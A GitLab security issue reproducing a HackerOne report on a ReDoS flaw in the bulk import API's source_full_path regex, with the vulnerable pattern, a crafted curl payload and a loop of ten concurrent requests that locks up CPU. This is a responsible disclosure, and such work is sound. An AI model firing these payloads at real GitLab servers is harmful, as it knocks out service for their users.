=== Content from gitlab.com_3e8486ff_20250110_235540.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# ReDoS in bulk import API when validating "full source path" parameter

âš  **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2011474](https://hackerone.com/reports/2011474)** by `joaxcar` on 2023-06-02, assigned to [@ngeorge1](/ngeorge1 "Nikhil George"):

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

#### Summary

**to triager: this looks similar to my report <https://hackerone.com/reports/2011464> but the regex and parameter differ from the other report**

The regexp for checking the `full source path` parameter in `bulk import API` is subject to "catastrophic backtracking". The regex is located here <https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/gitlab/regex.rb#L281> and looks like this

```
def bulk_import_source_full_path_regex
        [@]bulk_import_source_full_path_regex ||= %r/\A([.]?)[^\W](\/?([-_.+]*)*[0-9a-z][-_]*)+\z/i
end
```

its a pretty complex regex but the dangerous part is the nested quantifiers that can be simplified to this `(([-_.+]*)*[0-9a-z][-_]*)+\z` or even more simplified like this `((\+*)*a*)+\z`. If this regexp is used on a string that contains a regular character and then a long sequence of `+` characters the quantifiers will trigger a catastrophic backtracking issue <https://www.regular-expressions.info/catastrophic.html>. See images 1 and 2 for examples on <https://regex101.com/>

[![reg1.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/15118ec4a070eab7e3df3f9a372ec50a9730a048/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f33333930643962652d373233312d346237622d383966612d3863323832343334336232612f726567312e706e67)

[![reg2.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/58d295e682cf4beb2674851da58f71e64a452c02/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f62383234653461642d346438342d343264332d383338642d3339663635386364626236382f726567322e706e67)

This particular regex is used to validate the `full source path` parameter here <https://gitlab.com/gitlab-org/gitlab/-/blob/master/lib/api/bulk_imports.rb#L64>

```
requires :source_full_path,
                   type: String,
                   desc: 'Relative path of the source entity to import',
                   source_full_path: true,
                   documentation: { example: "'source/full/path' not 'https://example.com/source/full/path'" }
```

Given a payload in a request like this

```
curl --request POST  --header "PRIVATE-TOKEN: <TOKEN>" "https://example.gitlab.com/api/v4/bulk_imports" \
  --header "Content-Type: application/json" \
  --data '{
    "configuration": {
      "url": "https://example.com",
      "access_token": "not important"
    },
    "entities": [
      {
        "source_full_path": "a++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",
        "source_type": "project_entity",
        "destination_slug": "test",
        "destination_namespace": "test"
      }
    ]
  }'
```

it will lock up a `puma` thread at 100% CPU. Making 10 API calls made my Mac M2 pro have a response time of 1 min to load the front page of GitLab.

#### Steps to reproduce

On a local instance, you first need to go to <https://gitlab.example.com/admin/application_settings/general> and enable `Allow migrating GitLab groups and projects by direct transfer` (on Gitlab.com this is turned on)

1. Start a local instance of GitLab (you can use a docker image for this) see <https://docs.gitlab.com/ee/install/docker.html>

```
sudo docker run --detach \
  --hostname gitlab.example.com \
  --publish 4443:443 --publish 8080:80 --publish 2222:22 \
  --name gitlab \
  --restart always \
  --shm-size 256m \
  gitlab/gitlab-ee:latest
```

2. When its booted run this to get the root password needed to log in as admin

```
sudo docker exec -it gitlab grep 'Password:' /etc/gitlab/initial_root_password
```

3. Access the docker terminal with `sudo docker exec -it gitlab /bin/bash` (gitlab here is your container name)
4. Install `htop` with `apt-get update && apt-get install htop`
5. start `htop` with `htop`

Now log in to your instance

6. Log in

7. Create an access token on htts://gitlab.example.com/-/profile/personal\_access\_tokens

Open a new terminal

8. Run this script

```
for i in {1..10}
do
curl --request POST  --header "PRIVATE-TOKEN: <TOKEN>" "https://example.gitlab.com/api/v4/bulk_imports" \
  --header "Content-Type: application/json" \
  --data '{
    "configuration": {
      "url": "https://example.com",
      "access_token": "not important"
    },
    "entities": [
      {
        "source_full_path": "a++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++",
        "source_type": "project_entity",
        "destination_slug": "test",
        "destination_namespace": "test"
      }
    ]
  }' &
done
```

9. Go back to the browser and refresh. It should now not respond
10. Go to `htop` and see the puma threads working

#### Impact

ReDoS taking up CPU and causing resource consumption by low amount of requests

#### What is the current *bug* behavior?

The regexp used to validate `full source path` is vulnerable to backtracking issues

#### What is the expected *correct* behavior?

The regexp needs to be rewritten to avoid greedy backtracking

#### Output of checks

This bug happens on GitLab.com

##### Results of GitLab environment info

```
System information
System:
Current User:	git
Using RVM:	no
Ruby Version:	3.0.6p216
Gem Version:	3.4.13
Bundler Version:2.4.13
Rake Version:	13.0.6
Redis Version:	6.2.11
Sidekiq Version:6.5.7
Go Version:	unknown

GitLab information
Version:	16.0.1
Revision:	34d6370bacd
Directory:	/opt/gitlab/embedded/service/gitlab-rails
DB Adapter:	PostgreSQL
DB Version:	13.8
URL:		http://gitlab.example.com
HTTP Clone URL:	http://gitlab.example.com/some-group/some-project.git
SSH Clone URL:	git@gitlab.example.com:some-group/some-project.git
Using LDAP:	no
Using Omniauth:	yes
Omniauth Providers:

GitLab Shell
Version:	14.20.0
Repository storages:
- default: 	unix:/var/opt/gitlab/gitaly/gitaly.socket
GitLab Shell path:		/opt/gitlab/embedded/service/gitlab-shell
```

#### Impact

ReDoS locking up CPU and causing resource consumption by low amount of requests

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [reg1.png](https://h1.sec.gitlab.net/a/3390d9be-7231-4b7b-89fa-8c2824343b2a/reg1.png)
* [reg2.png](https://h1.sec.gitlab.net/a/b824e4ad-4d84-42d3-838d-39f658cdbb68/reg2.png)

## How To Reproduce

Please add [reproducibility information](https://about.gitlab.com/handbook/engineering/security/#reproducibility-on-security-issues) to this section:

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.


